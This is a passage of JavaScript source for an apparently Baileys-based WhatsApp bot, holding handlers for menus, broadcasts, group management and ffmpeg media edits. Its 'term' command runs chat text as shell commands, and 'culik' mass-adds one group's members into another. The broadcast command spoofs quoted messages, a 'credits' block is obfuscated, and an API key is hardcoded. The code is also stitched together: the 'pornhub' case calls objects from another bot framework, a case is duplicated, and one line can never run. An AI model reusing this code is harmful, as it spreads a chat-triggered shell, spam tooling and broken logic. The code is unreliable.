⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
      𝙱𝙰𝚃𝚃𝙴𝚁𝚈 : ${baterai}% 
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟ 
`
    ownermenubutton = [{buttonId:`${prefix}help`,buttonText:{displayText:'➥ BACK'},type:1},
]
 ownermenumessage = { contentText: `${teks}`, footerText: `⍟ @${sender.split("@")[0]} ⍟`, buttons: ownermenubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, ownermenumessage, MessageType.buttonsMessage)
             break  
             case 'groupmenu':
             if (!isGroupAdmins) return reply(mess.only.admin)
              bosco1 = await bosco.prepareMessage(from, fs.readFileSync('./ds.jpg'), location, {thumbnail: fs.readFileSync('./ds.jpg')})
              bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
              groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'charging' : 'not charging'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await bosco.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
     *Gʀᴏᴜᴘ Mᴇɴᴜ*
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
００：１０ ━●━━━━━────４：０７

▯ 🗞️${prefix}add
▯ 🗞️${prefix}kick
▯ 🗞️${prefix}promote
▯ 🗞️${prefix}demote
▯ 🗞️${prefix}disappear
▯ 🗞️${prefix}group
▯ 🗞️${prefix}antilink
▯ 🗞️${prefix}totag
▯ 🗞️${prefix}hidetag
▯ 🗞️${prefix}translate
▯ 🗞️${prefix}getdeskgc
▯ 🗞️${prefix}getbio
▯ 🗞️${prefix}getdeskgc
▯ 🗞️${prefix}getpp
▯ 🗞️${prefix}getname
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
      𝙱𝙰𝚃𝚃𝙴𝚁𝚈 : ${baterai}% 
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟ 
`
    groupmenubutton = [{buttonId:`${prefix}help`,buttonText:{displayText:'➥ BACK'},type:1},
]
 groupmenumessage = { contentText: `${teks}`, footerText: `⍟ @${sender.split("@")[0]} ⍟`, buttons: groupmenubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, groupmenumessage, MessageType.buttonsMessage)
             break  
 case 'intakemenu':
 if (!isGroupAdmins) return reply(mess.only.admin)
 
 listMsg = {
 buttonText: '𝐌𝐄𝐍𝐔 𝐋𝐈𝐒𝐓',
 footerText: 'tedzo Bot',
 description: `Hi, Please select the intake menu here, use it wisely`,
 sections: [
                     {
                      "title": `ᴛᴇᴅᴢᴏ sᴇʀ`,
 rows: [
                          {
                             "title": "𝐀𝐥𝐥 𝐌𝐄𝐍𝐔",
                              "rowId": "allmenu"
                          },
                          {
                              "title": "𝐌𝐀𝐊𝐄𝐑 𝐌𝐄𝐍𝐔",
                              "rowId": "makermenu"
                           },
                          {
                              "title": "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔",
                              "rowId": "ownermenu"
                           },
                           {
                              "title": "𝐄𝐃𝐈𝐓 𝐌𝐄𝐍𝐔",
                              "rowId": "editmenu"
                           },
                           {
                              "title": "𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔",
                              "rowId": "groupmenu"
                           },
                           {
                              "title": "𝐒𝐓𝐎𝐑𝐀𝐆𝐄 𝐌𝐄𝐍𝐔",
                              "rowId": "storagemenu"
                           },
                           {
                              "title": "𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔",
                              "rowId": "downloadmenu"
                           },
                           {
                              "title": "𝐄𝐗𝐓𝐀 𝐌𝐄𝐍𝐔",
                              "rowId": "extramenu"
                           },
                           {
                              "title": "𝐑𝐔𝐋𝐄𝐒",
                              "rowId": "rules"
                           }
                        ]
                     }],
 listType: 1
}
bosco.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:fvid})
break
if (!isGroupAdmins) return reply(mess.only.admin)
   case 'rules':
           rules1 = `
-----[ 𝑹 𝑼 𝑳 𝑬 𝑺 ]-----

1. 𝙳𝙾𝙽𝚃 𝙲𝙰𝙻𝙻 𝙱𝙾𝚃

2. 𝙳𝙾𝙽𝚃 𝚂𝙿𝙰𝙼 𝙱𝙾𝚃

3. 𝙳𝙾𝙽𝚃 𝙿𝙼 𝙱𝙾𝚃

4. 𝙳𝙾𝙽𝚃 𝙼𝙸𝚂𝚄𝚂𝙴 𝚃𝙷𝙴 𝙱𝙾𝚃

5. 𝙰𝙽𝚈 𝙿𝚁𝙾𝙱𝙻𝙴𝙼 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 𝙾𝚄𝚁 𝙾𝚆𝙽𝙴𝚁
wa.me/${owner}`
       osk = bosco.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 8157849715, "message": `${rules1}`, "footerText": "hehe", "thumbnail": denis, "surface": 'CATALOG'}}, {quoted:ftrol})
            bosco.relayWAMessage(osk)
       break
   case 'credits':
   function _0x4bbd(){var _0x5b8edb=['2095830VjJJiF','\x0a\x0a\x20▢\x20:\x20wa.me/','\x0a\x0a\x20','5267880lROrnj','CATALOG','33609wAGVBo','0','prepareMessageFromContent','relayWAMessage','4972079yWqsym','126495MscqCV','472Lglbxe','\x0a\x0a\x20\x20\x20[\x20𝐵𝑜𝑠𝑐𝑜\x20𝐶𝑟𝑒𝑑𝑖𝑡𝑠\x20𝐵𝑦\x20]\x20:\x0a\x0a\x20\x20\x20\x0a\x0a\x20▢\x20:\x20wa.me/','917736622139','1506VxXXmd','split','12502880746','6575168hvwamC','32935KmKOyd'];_0x4bbd=function(){return _0x5b8edb;};return _0x4bbd();}function _0x465a(_0x1299f0,_0x564e19){var _0x4bbd7c=_0x4bbd();return _0x465a=function(_0x465a2c,_0x203c87){_0x465a2c=_0x465a2c-0x1d6;var _0x346af7=_0x4bbd7c[_0x465a2c];return _0x346af7;},_0x465a(_0x1299f0,_0x564e19);}var _0x596dfa=_0x465a;(function(_0x559d9d,_0x273832){var _0x530608=_0x465a,_0x15be3d=_0x559d9d();while(!![]){try{var _0x581c1b=parseInt(_0x530608(0x1d9))/0x1+-parseInt(_0x530608(0x1e2))/0x2+parseInt(_0x530608(0x1e7))/0x3*(parseInt(_0x530608(0x1da))/0x4)+-parseInt(_0x530608(0x1e1))/0x5*(parseInt(_0x530608(0x1dd))/0x6)+parseInt(_0x530608(0x1d8))/0x7+parseInt(_0x530608(0x1e0))/0x8+parseInt(_0x530608(0x1e5))/0x9;if(_0x581c1b===_0x273832)break;else _0x15be3d['push'](_0x15be3d['shift']());}catch(_0x5572dc){_0x15be3d['push'](_0x15be3d['shift']());}}}(_0x4bbd,0xd31c6),dtod=_0x596dfa(0x1df),dtod1='0',dtod2=_0x596dfa(0x1dc),dtod3=_0x596dfa(0x1e8),dtod4='0');var v=_0x596dfa(0x1db)+dtod1[_0x596dfa(0x1de)]('@')[0x0]+_0x596dfa(0x1e3)+dtod[_0x596dfa(0x1de)]('@')[0x0]+_0x596dfa(0x1e3)+dtod2['split']('@')[0x0]+'\x0a\x0a\x20▢\x20:\x20wa.me/'+dtod3[_0x596dfa(0x1de)]('@')[0x0]+_0x596dfa(0x1e3)+dtod4[_0x596dfa(0x1de)]('@')[0x0]+_0x596dfa(0x1e4);credit=bosco[_0x596dfa(0x1d6)](from,{'orderMessage':{'itemCount':0x3e8,'message':''+v,'footerText':'hehe','thumbnail':denis,'surface':_0x596dfa(0x1e6)}},{'quoted':mek}),bosco[_0x596dfa(0x1d7)](credit);
        break
//------------------< Sticker Cmd >-------------------

       case 'addcmd': 
       case 'setcmd':
              if (isQuotedSticker) {
              if (!q) return reply(`Use : ${command} cmd and tag sticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              textImg("Done!")
              } else {
              reply('*Reply To Sticker*')
              }
              break
       case 'delcmd':
              if (!isQuotedSticker) return reply(`Use : ${command} Reply Sticker`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              _scommand.splice(getCommandPosition(kodenya), 1)
              fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
              textImg("Done!")
              break
       case 'listcmd':
              let teksnyee = `*「 𝙇𝙄𝙎𝙏 𝙎𝙏𝙄𝘾𝙆𝙀𝙍 𝘾𝙈𝘿 」*`
              let cemde = [];
              for (let i of _scommand) {
              cemde.push(i.id)
              teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`
               }
              mentions(teksnyee, cemde, true)
              break
//------------------< Bot Owner >-------------------

        case 'clearall':
					anu = await bosco.chats.all()
					bosco.setMaxListeners(25)
					for (let _ of anu) {
					 bosco.deleteMessage(_.jid)
					}
					reply('*done*')
					break
         case 'setprefix':
				prefix = args.join(' ')
				bosco.sendMessage(from, `*Succes Changing Prefix : ${prefix}*`, text, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
				break
         case 'getquoted':
             reply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
             break
         case 'gc':
       case 'group':
        rows = [
           {title: 'open', description: "", rowId: `OPEN`},
           {title: 'close', description: "", rowId: `CLOSE`},
           {title: 'on', description: "", rowId: `on`},
           {title: 'off', description: "", rowId: `off`}]
          section = [{title: "𝙵𝙾𝙻𝙻𝙾𝚆 𝙼𝚈 𝙸𝚂𝙽𝚂𝚃𝙰 𝚃𝙴𝙳𝚉𝙾 Sɪʀ Fᴏʀ Mᴏʀᴇ Uᴘᴅᴀᴛᴇs", rows: rows}]
          button = {buttonText: 'SELECT', description: `*Gʀᴏᴜᴘ [ᴏᴘᴇɴ/ᴄʟᴏsᴇ]*\n*Dɪsᴀᴘᴘᴇᴀʀ Mᴇsᴀᴀɢᴇ [ᴏɴ/ᴏғғ]*`,
          sections: section, listType: 1}
          bosco.sendMessage(from, button, MessageType.listMessage, {quoted: ftroli})
                    break
         case 'online':
            if (!isOwner && !mek.key.fromMe) return
				offline = false
				fgclink('*BOT ONLINE*')
				break
          case 'offline':
            if (!mek.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            fgclink('*BOT OFFLINE*')
            break   
            case 'pornhub':
					if (args.length >= 2 && arks.includes('|')) {
						if (arg.split('|')[0].length >= 10 || arg.split('|')[1].length >= 10) return await kill.reply(from, 'Max: 10 letras/letters p/frase - phrase.', id)
						await kill.reply(from, mess.wait() + '\n\n20+ s.', id)
						try {
							await maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", arg.split('|')).then(async (data) => {
								await kill.sendFileFromUrl(from, data, 'textpro.jpg', '', id)
							})
						} catch (error) {
							tools('others').reportConsole(command, error)
							await kill.reply(from, mess.fail(command, error, time), id)
						}
					} else return await kill.reply(from, mess.noargs() + 'palavras/words/números/numbers.' + '\n\n' + mess.argsbar() + 'use 1 "|".', id)
				break

          case 'tobc':
					bosco.updatePresence(from, Presence.composing)
					if (!isOwner) return reply(mess.only.owner)
					anu = await bosco.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
					const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					buff = await bosco.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					bosco.sendMessage(_.jid, buff, audio, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "917736835721@s.whatsapp.net" } : {})}, message: { orderMessage: { itemCount: 1000, status: 200, thumbnail: fs.readFileSync('.media/life.pdf'), surface: 200, message: `${body.slice(5)}`, orderTitle: `hm`, sellerJid: '0@s.whatsapp.net'}}}, mimetype: 'audio/mp4', duration: '1', ptt: true, contextInfo: { forwardingScore: 000, isForwarded: true}})
					}
					} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
					const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					buff = await bosco.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					bosco.sendMessage(_.jid, buff, sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 2021, status: 200, thumbnail: fs.readFileSync('./ds.jpg'), surface: 200, message: `${body.slice(5)}`, orderTitle: `ʙʀᴏᴀᴅᴄᴀsᴛ`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
					} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
					const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					buff = await bosco.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					bosco.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 2021, status: 200, thumbnail: fs.readFileSync('./ds.jpg'), surface: 200, message: `${body.slice(5)}`, orderTitle: `ʙʀᴏᴀᴅᴄᴀsᴛ`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
					}
					} else if (isMedia && !mek.message.videoMessage || isQuotedGif) {
					const encmedia = isQuotedGif ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					buff = await bosco.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					bosco.sendMessage(_.jid, buff, gif, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 1000, status: 200, thumbnail: fs.readFileSync('./ds.jpg'), surface: 200, message: `𝑬𝑽𝑬𝑹𝒀𝑻𝑯𝑰𝑵𝑮\n𝑾𝑰𝑳𝑳 𝑩𝑬\n😎𝑶𝑲😎`, orderTitle: `ʙʀᴏᴀᴅᴄᴀsᴛ`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 22, isForwarded: true}})
					}
					} else {
                    reply('*Reply To Sticker/Audio/Video*')
				    }
					break
               case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
reply(`*Restarting*`)
exec(`cd &&  node main`)
sleep(4000)
reply('*Success*')
break
      case "setbgmpic":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await bosco.downloadMediaMessage(boij);
          fs.writeFileSync(`./hemme.jpg`, delb);
          reply("Success");
        } else {
          reply(`Send a picture with a caption ${prefix}sethumb`);
        }
        break
      case "setthumb":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await bosco.downloadMediaMessage(boij);
          fs.writeFileSync(`./ds.jpg`, delb);
          reply("Success");
        } else {
          reply(`Send a picture with a caption ${prefix}sethumb`);
        }
        break
        case 'exif':
             if (args.length == 0) return reply(`Ex:- ${prefix}exif Denis Ser`)
             if (!isOwner) return  reply(mess.only.owner)
             if (!q) return reply(mess.wrongFormat)
             if (!arg.split('|')) return reply(`Use ${prefix}exif nama|author`)
             exif.create(arg.split('|')[0], arg.split('|')[1])
             reply('*Succes*')
             break	
          case 'axif':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					const exifff = `${args.join(' ')}`
					const namaPack = exifff.split('|')[0]
					const authorPack = exifff.split('|')[1]
					exif.create(namaPack, authorPack)
					await reply('Done gan')
				break
     case 'searchmsg':  //by ANU TEAM
             if (args.length < 1) return reply(`*What Message Are You Looking For?*\n*Example* : ${prefix + command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return reply('*Must be a Number!*')
             batas = parseInt(sampai) + 1
             if (batas > 30) return reply('*Max 30!*')
             reply(mess.wait)
             cok = await bosco.searchMessages(`${ve}`, from, batas,1) 
             if (cok.messages.length < 2) return reply('*Message Not Found*') 
             if (cok.messages.length < parseInt(batas)) reply(`*Found Only* ${cok.messages.length - 1} *Message*`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             bosco.sendMessage(from, `*Found..!*`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
}
}
             } catch (e) {
             return reply(String(e))
}
             } else {
             reply(`*The format is wrong tod, this is an example of the correct format* : ${prefix + command} halo|10`)
}
             break
     case 'seenby':
             if(!isGroup) return reply(mess.only.group)
             try {
             infom = await bosco.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
             tagg = []
             teks = `*• Read by :*\n\n`
             for(let i of infom.reads){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY hh:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             teks += `*• Delivered to :*\n\n`
             for(let i of infom.deliveries){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY hh:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             mentions(teks, tagg, true)
             } catch (e) {
             console.log(color(e))
             reply('*Reply chat bot!*')
}
             break
      case 'leave':
              if (!isGroup) return reply(mess.only.group)
              setTimeout( () => {
              bosco.groupLeave(from) 
              }, 2000)
              setTimeout( () => {
              reply('*Byee all..:(* 🚶')
              }, 0)
              break
       case 'online':
       case 'listonline':
       case 'here':                
             if (!isGroup) return reply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(bosco.chats.get(ido).presences), bosco.user.jid]
             bosco.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
      case 'join': 
             if (args.length == 0) return reply(`Ex:- ${prefix}join https://chat.whatsapp.com`)
             if (!q) return reply('*The link?*')
             if (!isOwner) return reply(mess.only.owner)
             if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('*The link is invalid Tod*')
             link = args[0].replace('https://chat.whatsapp.com/','')
             fak = bosco.query({ json: ['action', 'invite', link],
             expect200: true })
             reply('*Successfully Entered Group*')
             break
      case 'readall':
					if (!mek.key.fromMe) return reply('```OWNER ONLY```')
					var chats = await bosco.chats.all()
                    chats.map( async ({ jid }) => {
                          await bosco.chatRead(jid)
                    })
					rdl = `*Successfully read ${chats.length} Chat !*`
					await bosco.sendMessage(from, rdl, MessageType.text, {quoted: ftroli})
					console.log(chats.length)
					break
      case 'imgtourl':
       case 'url':
               reply(mess.wait) 
               var imgbb = require('imgbb-uploader')
               var encmediahe  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               var mediahe = await  bosco.downloadAndSaveMediaMessage(encmediahe)       
               imgbb('39d895963468b814fad0514bd28787e2', mediahe)
              .then(data => {
               var caps = `*IMAGE TO URL*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
               ibb = fs.readFileSync(mediahe)
               bosco.sendMessage(from, ibb, image, { quoted: mek, caption: caps})
})
              .catch(err => {
               throw err
})
               break
      case 'term':
             if (!isOwner) return
             if (args.length == 0) return reply(`Ex:- ${prefix}term sendKontak`)
             if (!q) return
             exec(q, (err, stdout) => {
             if (err) return reply(`${err}`)
             if (stdout) {
             reply(stdout)
}
})
             break 
      case 'rall':
				const readallid = await bosco.chats.all()
			bosco.setMaxListeners(25)
				for (let xyz of readallid) {
					await bosco.chatRead(xyz.jid)
				}
		      bosco.sendMessage(from, `Sukses!`, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "Berhasil membaca semua chat!", 'jpegThumbnail': fs.readFileSync('./ds.jpg')}}}})
              break
      case 'shutdown':
             if (!isOwner) return reply(mess.owner.only)
             reply(`Bye...`)
             await sleep(3000)
             process.exit()
             break
      case 'leaveall':
             if (!isOwner) return  
             let totalgroup = bosco.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
             for (let id of totalgroup) {
             sendMess(id, 'Byee', null)
             await sleep(3000)
             bosco.groupLeave(id)
}
             break
       case 'culik':
              if (!isOwner) return
              if (args.length < 1) return reply('*Enter the group id lol*')
              let pantek = []
              for (let i of groupMembers) {
              pantek.push(i.jid)
}
              bosco.groupAdd(args[0], pantek)
              break
     
      case 'hidetag':
             try {
             quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             hideTag(from, `${quotedText}`)
             } catch {
             hideTag(from, `${q}`)
}
             break
       case 'denis':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, 𝚃𝙴𝙳𝚉𝙾 Poli Ahn ${qq} 𝚃𝙴𝙳𝚉𝙾 Killadi Ahnu ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
        case 'jadibot':
        case 'make1':
              if (!isOwner) return
              jadibot(reply,bosco,from)
              break
       case 'stopjadibot':
             stopjadibot(reply)
             break
      case 'listbot':
      case 'listjadibot':
          text = '*「 𝕃𝕀𝕊𝕋 𝕁𝔸𝔻𝕀𝔹𝕆𝕋 」*\n\n'
             for(let i of listjadibot) {
             text += `*Number* : ${i.jid.split('@')[0]}
*Name* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
}
            reply(text)
            break

//------------------< Editing/Audio/Video >-------------------

                case 'tr':
                case 'translate':
                    if (args.length == 0) return reply(`Example: ${prefix + command} en apa`)
                    kode_negara = args[0]
                    args.shift()
                    teks = args.join(" ")
                    translate(`${teks}`,{to:`${kode_negara}`}).then( res => {
                    ini_txt = `*Translate*
                     Lng : ${res.from.language.iso}
                     result : ${res.text}`
                     reply(ini_txt)
                     })
                     break    
               case 'secvn':
                    reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
					bosco.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
					fs.unlinkSync(media)
				    break
				case 'secvideo':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(media)
					bosco.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
					fs.unlinkSync(media)
				    break
               case 'voice':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) return reply('*_ғᴀɪʟᴅ ᴛᴏ ᴄᴏɴᴠᴇʀᴛ ᴘᴛᴛ_*')
					topt = fs.readFileSync(ran)
					bosco.sendMessage(from, topt, audio, { mimetype: 'audio/mp4', ptt: true, quoted: mek })
					})
					break
               case 'take':
              case 'colong':
                    if (!isQuotedSticker) return reply('*𝕁𝕌𝕊𝕋 𝔸 𝕊𝕋𝕀ℂ𝕂𝔼ℝ*')
                    encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		            media = await bosco.downloadAndSaveMediaMessage(encmedia)
                    anu = args.join(' ').split('|')
                    satu = anu[0] !== '' ? anu[0] : `Denis`
                    dua = typeof anu[1] !== 'undefined' ? anu[1] : `BOT`
                    require('./lib/fetch.js').createExif(satu, dua)
			        require('./lib/fetch.js').modStick(media, bosco, mek, from)
			        break
             case 'fastvid':
		            if (!isQuotedVideo) return fakeitem('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await bosco.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            bosco.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'slowvid':
		            if (!isQuotedVideo) return fakeitem('Reply videonya!')
		            fakegroup(mess.wait)
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await bosco.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            bosco.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
		    case 'reversevid':
		            if (!isQuotedVideo) return fakeitem('```Reply videonya!```')
		            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		            media = await bosco.downloadAndSaveMediaMessage(encmedia)
		            ran = getRandom('.mp4')
		            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
		            fs.unlinkSync(media)
		            if (err) return fakegroup(`Err: ${err}`)
		            buffer453 = fs.readFileSync(ran)
		            bosco.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
		            fs.unlinkSync(ran)
		            })
		            break
             case 'nightcore':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						bosco.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftoko,duration:11})
						fs.unlinkSync(ran)
					   })
				       break 
		    
             case 'imut':
             case 'baby':
                   if (!isQuotedAudio) return fgclink('reply to audio')
				    encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				    media = await bosco.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=3/4,asetrate=44508*4/3 ${ran}`, (err, stderr, stdout) => {
				    fs.unlinkSync(media)
					if (err) return reply('Error!')
					hah = fs.readFileSync(ran)
